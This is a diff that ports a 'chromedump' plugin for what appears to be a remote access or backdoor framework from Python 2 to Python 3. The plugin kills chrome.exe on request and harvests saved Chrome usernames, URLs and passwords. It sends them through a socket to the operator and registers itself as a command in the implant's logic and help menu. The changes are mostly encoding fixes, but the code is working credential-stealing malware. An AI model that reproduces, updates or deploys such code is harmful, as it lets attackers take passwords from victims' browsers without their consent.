@@ -18,8 +18,8 @@ def chromedump(arg):
         Popen('taskkill /f /im chrome.exe', shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
         msg += '[+]Killed chrome process'
     elif arg == 'passive':
-        if 'chrome.exe' in check_output(['tasklist']):
-            s.sendall('[-]Chrome is currently running, this module will not do anything until chrome stops')
+        if 'chrome.exe'.encode() in check_output(['tasklist']):
+            s.sendall('[-]Chrome is currently running, this module will not do anything until chrome stops'.encode())
             return
     else:
         raise IndexError
@@ -45,18 +45,18 @@ def chromedump(arg):
         msg += '\\n[-]No passwords present'
     else:
         for i in info_list:
-            msg += '\\n   [+]Username : ' + i['username'].encode('ascii','ignore')
-            msg += '\\n      URL      : ' + i['origin_url'].encode('ascii','ignore')
-            msg += '\\n      Password : ' + i['password'].encode('ascii','ignore')
-    s.sendall(msg)''')
+            msg += '\\n   [+]Username : ' + i['username'].encode('ascii','ignore').decode()
+            msg += '\\n      URL      : ' + i['origin_url'].encode('ascii','ignore').decode()
+            msg += '\\n      Password : ' + i['password'].encode('ascii','ignore').decode()
+    s.sendall(msg.encode())''')
         config.logics.append('''
             elif command == "chromedump":
                 chromedump(data)''')
         config.help_menu[
             'chromedump ["active"|"passive"]'] = 'Dumps chrome passwords. If "active" kills chrome.exe first, if "passive" will not run if chrome.exe is running'
     elif option == 'info':
-        print '\nName             : Chrome password dump' \
+        print('\nName             : Chrome password dump' \
               '\nOS               : Windows' \
               '\nRequired Modules : pypiwin32 (external), os' \
               '\nCommands         : chromedump ["active"|"passive"]' \
-              '\nDescription      : Dumps chrome passwords. If "active" kills chrome.exe first, if "passive" will not run if chrome.exe is running \n'
+              '\nDescription      : Dumps chrome passwords. If "active" kills chrome.exe first, if "passive" will not run if chrome.exe is running \n')
